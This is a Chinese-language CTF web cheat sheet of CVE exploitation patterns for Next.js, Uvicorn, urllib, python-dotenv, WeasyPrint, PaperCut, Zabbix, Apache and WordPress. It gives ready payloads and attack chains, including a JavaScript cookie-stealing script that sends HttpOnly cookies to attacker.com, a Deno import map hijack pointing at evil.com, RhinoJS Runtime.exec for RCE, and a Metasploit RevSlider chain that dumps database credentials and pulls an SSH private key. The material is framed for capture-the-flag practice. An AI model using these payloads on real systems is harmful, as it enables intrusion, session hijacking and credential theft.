# CTF Web - CVE 与浏览器漏洞

具体的 CVE 与漏洞模式。Node.js 相关 CVE（flatnest、Happy-DOM）见 [node-and-prototype.md](node-and-prototype.md)。JWT 算法混淆见 [auth-and-access.md](auth-and-access.md)。

## 目录
- [CVE-2025-29927：Next.js 中间件绕过](#cve-2025-29927nextjs-中间件绕过)
- [CVE-2025-0167：Curl .netrc 凭据泄露](#cve-2025-0167curl-netrc-凭据泄露)
- [Uvicorn CRLF 注入（未修复的 N-Day）](#uvicorn-crlf-注入未修复的-n-day)
- [Python urllib 协议校验绕过（0-Day）](#python-urllib-协议校验绕过0-day)
- [Chrome 通过 Link 头的 Referrer 泄露（2025）](#chrome-通过-link-头的-referrer-泄露2025)
- [TCP 分包（防火墙绕过）](#tcp-分包防火墙绕过)
- [Puppeteer/Chrome 的 JavaScript 绕过](#puppeteerchrome-的-javascript-绕过)
- [Python python-dotenv 注入](#python-python-dotenv-注入)
- [通过 RFC 2047 的 HTTP 请求拆分](#通过-rfc-2047-的-http-请求拆分)
- [Waitress WSGI Cookie 外带](#waitress-wsgi-cookie-外带)
- [Deno Import Map 劫持](#deno-import-map-劫持)
- [CVE-2025-8110：Gogs 符号链接 RCE](#cve-2025-8110gogs-符号链接-rce)
- [CVE-2021-22204：ExifTool DjVu Perl 注入](#cve-2021-22204exiftool-djvu-perl-注入)
- [恒真哈希校验导致的认证缺陷（0xFun 2026）](#恒真哈希校验导致的认证缺陷0xfun-2026)
- [AAEncode/JJEncode JS 反混淆（0xFun 2026）](#aaencodejjencode-js-反混淆0xfun-2026)
- [协议复用——同一端口跑 SSH+HTTP（0xFun 2026）](#协议复用同一端口跑-sshhttp0xfun-2026)
- [CVE-2024-28184：WeasyPrint 附件 SSRF / 文件读取](#cve-2024-28184weasyprint-附件-ssrf--文件读取)
- [CVE-2025-55182 / CVE-2025-66478：React Server Components Flight 协议 RCE](#cve-2025-55182--cve-2025-66478react-server-components-flight-协议-rce)
- [CVE-2024-45409：Ruby-SAML XPath 摘要夹带（Barrier HTB）](#cve-2024-45409ruby-saml-xpath-摘要夹带barrier-htb)
- [CVE-2023-27350：PaperCut NG 认证绕过 + RCE（Bamboo HTB）](#cve-2023-27350papercut-ng-认证绕过--rcebamboo-htb)
- [CVE-2024-22120：Zabbix 时间盲 SQLi（Watcher HTB）](#cve-2024-22120zabbix-时间盲-sqliwatcher-htb)
- [CVE-2012-0053：Apache 借 400 Bad Request 泄露 HttpOnly Cookie（RC3 CTF 2016）](#cve-2012-0053apache-借-400-bad-request-泄露-httponly-cookierc3-ctf-2016)
- [CVE-2014-9735：WordPress RevSlider 上传 + MySQL load_file() SSH 跳板（TAMUctf 2019）](#cve-2014-9735wordpress-revslider-上传--mysql-load_file-ssh-跳板tamuctf-2019)
- [检测清单](#检测清单)

---

<a id="cve-2025-29927-nextjs-middleware-bypass"></a>
## CVE-2025-29927：Next.js 中间件绕过

**受影响版本：** Next.js < 14.2.25，以及 15.x < 15.2.3

```http
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

绕过认证中间件，访问受保护端点、仅管理员可用的路由。

**与 SSRF 串联（CVE-2025-57822；Note Keeper，Pragyan 2026）：** 绕过中间件后，注入 `Location` 头即可触发 Next.js 向任意 URL 发起内部 fetch：
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```
Next.js 会处理 `Location` 头并在内部拉取指定 URL，从而 SSRF 访问内部服务（这是独立的 CVE-2025-57822 反射/SSRF 缺陷，不是 CVE-2025-29927）。

---

<a id="cve-2025-0167-curl-netrc-credential-leakage"></a>
## CVE-2025-0167：Curl .netrc 凭据泄露

当 curl 使用 `.netrc` 文件**并且**跟随 HTTP 重定向时，可能把第一个主机的密码泄露给重定向目标——**仅当** `.netrc` 中存在一个不带 `login`/`password` 的裸 `default` 条目：

```text
machine nn.tld
  login mary
  password maryspassword
default
```

受影响：curl/libcurl 7.76.0 到 8.11.1；8.12.0 修复。`401`/`WWW-Authenticate` 质询**不是**前置条件。

---

<a id="uvicorn-crlf-injection-unpatched-n-day"></a>
## Uvicorn CRLF 注入（未修复的 N-Day）

**受影响：** Uvicorn（FastAPI 默认 ASGI 服务器）——已上报但被忽略。

Uvicorn 不净化响应头中的 CRLF。可用于：
1. **CSP 绕过**——注入头破坏 Content-Security-Policy
2. **缓存投毒**——破坏头/体边界，让 Nginx 缓存攻击者内容
3. **XSS**——`\r\n\r\n` 终止头部，其余部分变成响应体

```python
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

**识别：** FastAPI/Uvicorn 后端 + 有端点在响应头里反射用户输入。

---

<a id="python-urllib-scheme-validation-bypass-0-day"></a>
## Python urllib 协议校验绕过（0-Day）

**受影响：** Python `urllib`——`urlsplit` 与 `urlretrieve` 行为不一致。

`urlsplit("<URL:http://attacker.com/evil>").scheme` 返回 `""`（空），但 `urlretrieve` 仍会按 HTTP 去拉取。

```python
# App blocks http/https via urlsplit:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# Bypass: <URL:http://attacker.com/malicious.so>
# Also: %0ahttp://attacker.com/malicious.so (newline prefix)
```

`<URL:...>` 是 RFC 1738 的遗留格式。

---

<a id="chrome-referrer-leak-via-link-header-2025"></a>
## Chrome 通过 Link 头的 Referrer 泄露（2025）

```http
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome 拉取该链接资源时携带完整 referrer URL → 泄露 `/auth/callback?token=secret` 中的 token。

---

<a id="tcp-packet-splitting-firewall-bypass"></a>
## TCP 分包（防火墙绕过）

把被拦截的关键字拆到不同 TCP 包的边界上：
```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
```

---

<a id="puppeteerchrome-javascript-bypass"></a>
## Puppeteer/Chrome 的 JavaScript 绕过

`page.setJavaScriptEnabled(false)` 只影响当前上下文。从 iframe 调 `window.open()` 打开的新窗口，JS 仍是启用的。

---

<a id="python-python-dotenv-injection"></a>
## Python python-dotenv 注入

在值里使用转义序列和换行：
```text
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```
与 `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER=/bin/sh -c "cat /flag" %s` 串联可 RCE。

---

<a id="http-request-splitting-via-rfc-2047"></a>
## 通过 RFC 2047 的 HTTP 请求拆分

CherryPy 解码 RFC 2047 头 → CRLF 注入：
```python
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

---

<a id="waitress-wsgi-cookie-exfiltration"></a>
## Waitress WSGI Cookie 外带

非法 HTTP 方法会被回显在错误响应里。用 CRLF 拆分请求，Cookie 值落到方法位置，错误页把它回显出来。

---

<a id="deno-import-map-hijacking"></a>
## Deno Import Map 劫持

Deno v1.18+ 会自动发现 `deno.json`。借助原型污染：
```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

---

<a id="cve-2025-8110-gogs-symlink-rce"></a>
## CVE-2025-8110：Gogs 符号链接 RCE

完整细节见 [server-side.md](server-side.md)。

---

<a id="cve-2021-22204-exiftool-djvu-perl-injection"></a>
## CVE-2021-22204：ExifTool DjVu Perl 注入

**受影响：** ExifTool ≤ 12.23。DjVu 的 ANTa 注释块用 Perl `eval` 解析。构造一个含注入元数据的最小 DjVu，即可在任意用 ExifTool 处理图片的端点上实现 RCE。

完整利用代码见 [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204--djvu-perl-注入0xfun-2026)。

---

<a id="broken-auth-via-truthy-hash-check-0xfun-2026"></a>
## 恒真哈希校验导致的认证缺陷（0xFun 2026）

**模式：** `sha256().hexdigest()` 返回非空字符串（在 Python 中为真值）。认证函数写成 `if sha256(...)`，永远为 True——真正的哈希比较完全缺失。

**识别：** 找 `if hash_function(...)` 而不是 `if hash_function(...) == expected`。

---

<a id="aaencodejjencode-js-deobfuscation-0xfun-2026"></a>
## AAEncode/JJEncode JS 反混淆（0xFun 2026）

这类 JS 混淆最终都会调用 `Function(...)()`。覆写 `Function.prototype.constructor` 即可拦截：
```javascript
Function.prototype.constructor = function(code) {
    console.log("Decoded:", code);
    return function() {};
};
```

**AAEncode：** 日文 Unicode 字符。**JJEncode：** `$=~[]` 模式。两者最终都化简为 `Function(decoded_string)()`。

---

<a id="protocol-multiplexing--sshhttp-on-same-port-0xfun-2026"></a>
## 协议复用——同一端口跑 SSH+HTTP（0xFun 2026）

服务器按首字节区分 SSH 与 HTTP。当题目提到"端口更少"时，试 `ssh -p <http_port> user@host`。凭据可能藏在 HTML 注释里。

---

<a id="cve-2024-28184-weasyprint-attachment-ssrf--file-read"></a>
## CVE-2024-28184：WeasyPrint 附件 SSRF / 文件读取

**受影响：** WeasyPrint（多个版本）

**漏洞：** WeasyPrint 会处理 `<a rel="attachment">` 和 `<link rel="attachment">` 标签，拉取引用的 URL 并把结果嵌入为 PDF 附件。附件拉取**不**应用内部头检查（如 `X-Fetcher`）。

**攻击向量：**
1. **SSRF：** `<a rel="attachment" href="http://127.0.0.1/admin/flag">`——从 localhost 拉取，绕过 IP 限制
2. **本地文件读取：** `<link rel="attachment" href="file:///flag.txt">`——把本地文件嵌进 PDF
3. **盲注 oracle：** 只有目标返回 200 时附件才会出现在 PDF 里——用 `/Type /EmbeddedFile` 是否存在作为布尔 oracle

**提取：**
```bash
pdfdetach -list output.pdf        # List embedded files
pdfdetach -save 1 -o flag.txt output.pdf  # Extract
```

**识别：** 有 URL 转 PDF 功能，`requirements.txt` 或 `Pipfile` 里有 WeasyPrint。

---

<a id="cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce"></a>
## CVE-2025-55182 / CVE-2025-66478：React Server Components Flight 协议 RCE

**受影响：** React Server Components / Next.js（Flight 协议反序列化）。构造的伪造 Flight chunk 利用构造器链（`constructor → constructor → Function`）实现服务端任意 JavaScript 执行。通过 `Next-Action` + `Accept: text/x-component` 头识别。也作为 CVE-2025-66478 上报，其变体使用另一条原型链（用 `__proto__:then` 代替 `constructor:constructor`）。

完整利用链见 [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-协议-rceehax-2026)。

---

<a id="cve-2024-45409-ruby-saml-xpath-digest-smuggling-barrier-htb"></a>
## CVE-2024-45409：Ruby-SAML XPath 摘要夹带（Barrier HTB）

**受影响：** GitLab 17.3.2（ruby-saml 库）

利用 ruby-saml 签名校验中的 XPath 歧义，伪造声称任意用户身份的 SAML（Security Assertion Markup Language）断言。

**攻击链：**
1. 从合法的 SAML 响应中提取 IdP（身份提供方）元数据签名
2. 构造声称目标用户（如 `akadmin`）的断言
3. 把断言 ID 设为与元数据引用 URI 一致
4. 计算正确摘要并放进 `StatusDetail` 元素——XPath 会找到这个被夹带的摘要而不是原始的
5. 把伪造响应提交到 `/users/auth/saml/callback`

**识别：** GitLab < 17.3.3 且启用了 SAML SSO。

---

<a id="cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb"></a>
## CVE-2023-27350：PaperCut NG 认证绕过 + RCE（Bamboo HTB）

**受影响：** PaperCut NG < 22.0.9（CVSS 9.8）

**攻击链：**
1. 访问 `/app?service=page/SetupCompleted` 获得未认证的管理会话
2. 通过 Config Editor 启用 `print-and-device.script.enabled`、关闭 `print.script.sandboxed`
3. 在打印机设置里注入 RhinoJS 脚本实现 RCE：
```javascript
java.lang.Runtime.getRuntime().exec(["/bin/bash", "-c", "CMD"])
```
4. 通过 HTTP 回调 + base64 编码外带输出
5. 经 Squid 代理访问内部服务：
```bash
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
```

**要点：** SetupCompleted 端点无需任何凭据就授予完整管理员权限。与 Squid 代理串联即可访问内部服务。

---

<a id="cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb"></a>
## CVE-2024-22120：Zabbix 时间盲 SQLi（Watcher HTB）

**受影响：** Zabbix（通过 trapper 端口 10051 的审计日志功能）

利用 Zabbix trapper 协议中未净化的 `clientip` 字段实现时间盲 SQL 注入，再通过 Zabbix API 提权到 RCE。

**攻击链：**
1. 以 guest 身份登录 Zabbix 前端，base64 解码 Cookie 取出 `sessionid`
2. 通过 trapper 端口 10051 发送精心构造的 `clientip` 字段做时间盲 SQLi
3. 用 sleep 时序逐字符提取管理员 session ID
4. 用窃取的管理员会话认证 Zabbix API
5. 通过 `script.create` + `script.execute` API 调用实现 RCE

**要点：** 利用脚本输出里的 `\r`（回车）会留下可见残影。使用前确认提取到的 session ID 恰好是 32 个 hex 字符。

**识别：** Zabbix 的 trapper 端口 10051 对外暴露，且启用了审计日志功能。

---

<a id="cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016"></a>
## CVE-2012-0053：Apache 借 400 Bad Request 泄露 HttpOnly Cookie（RC3 CTF 2016）

Apache 2.2.x（2.2.22 之前）会在 400 Bad Request 错误页里回显 Cookie，绕过 HttpOnly 标志的保护。与 XSS 串联即可外带会话 Cookie。

```javascript
// XSS payload to trigger Apache 400 error and leak HttpOnly cookies
// Works on Apache 2.2.0 - 2.2.21

// Step 1: Inflate cookie header to exceed Apache's limit (triggers 400)
var xhr = new XMLHttpRequest();
document.cookie = "padding=" + "A".repeat(4000);

// Step 2: Request to the vulnerable Apache server
xhr.open("GET", "http://target:8080/", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // 400 response body contains ALL cookies including HttpOnly ones
        var cookies = xhr.responseText.match(/Cookie:.*$/m);
        // Exfiltrate to attacker
        new Image().src = "http://attacker.com/steal?c=" + encodeURIComponent(cookies);
    }
};
xhr.send();
```

**要点：** 2.2.22 之前的 Apache 2.2.x 会在 400 Bad Request 的 HTML 响应里带上完整的 Cookie 头，包括 HttpOnly Cookie。命同源的 XSS 后，HttpOnly 保护被完全击穿。看到可疑 Apache 实例时先查服务器版本头。

---

<a id="cve-2014-9735-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019"></a>
## CVE-2014-9735：WordPress RevSlider 上传 + MySQL load_file() SSH 跳板（TAMUctf 2019）

**受影响：** WordPress Slider Revolution（RevSlider）插件 `<= 3.0.95`——通过 admin-ajax 的 `update_plugin` action 实现任意文件上传，可未认证利用。

**版本指纹：** 拉取 `/wp-content/plugins/revslider/release_log.txt`——即使管理 UI 被锁死，插件也会把版本写在这里。

```bash
# 1. RCE via RevSlider upload (Metasploit module)
msfconsole -q -x "use exploit/unix/webapp/wp_revslider_upload_execute; \
  set RHOSTS 172.30.0.3; set LHOST tun0; exploit"

# 2. From the meterpreter shell, steal DB creds from wp-config.php
cat /var/www/wp-config.php | grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# -> DB_USER='wordpress', DB_PASSWORD='0NYa6PBH52y86C', DB_HOST='172.30.0.2'

# 3. Pivot: connect as the DB user and read any world-readable file with load_file()
mysql -h 172.30.0.2 -u wordpress --password='0NYa6PBH52y86C' \
      -e "SELECT load_file('/backup/id_rsa')"
#   (requires FILE privilege, granted to the WP user on older default stacks)

# 4. Use the exfiltrated key to SSH into the target as root
chmod 400 rsa.key
ssh -i rsa.key root@172.30.0.3
```

**要点：** 插件上传 RCE 很少是终点——接着从 `wp-config.php` 取出数据库凭据，连接数据库，用 `load_file()` 读取任意全局可读文件（`/backup/`、`/root/.ssh/`、`/home/*/.ssh/` 下的私钥、CI 机密等），再 SSH 跳板到真正的目标机。CTF 环境里 WP 用户几乎总有 FILE 权限。可与文件上传串联的利用模块：`wp_revslider_upload_execute`、`wp_admin_shell_upload`、`wp_asset_manager_upload_exec`、`wp_symposium_shell_upload`。

**参考：** TAMUctf 2019 — Wordpress，writeup 13593。Rapid7 模块 `exploit/unix/webapp/wp_revslider_upload_execute`。

---

<a id="detection-checklist"></a>
## 检测清单

1. `package.json`、`requirements.txt`、`Dockerfile` 里的**框架版本**
2. **ASGI/WSGI 服务器**（Uvicorn、Waitress）的 CRLF/头部问题
3. **curl 用法**中是否涉及 `.netrc` 或重定向处理
4. **防火墙/WAF** 的检测模式（TCP 分包）
5. **dotenv** 或环境变量处理
6. **urllib** 协议校验（检查 `<URL:...>` 绕过）
7. **Node.js 库**——完整清单见 [node-and-prototype.md](node-and-prototype.md)
8. **GitLab + SAML SSO**——检查版本是否受 ruby-saml CVE-2024-45409 影响
9. **PaperCut NG**——检查 `/app?service=page/SetupCompleted` 是否可未认证访问
10. **Zabbix trapper 端口**（10051）——`clientip` 字段的审计日志 SQLi
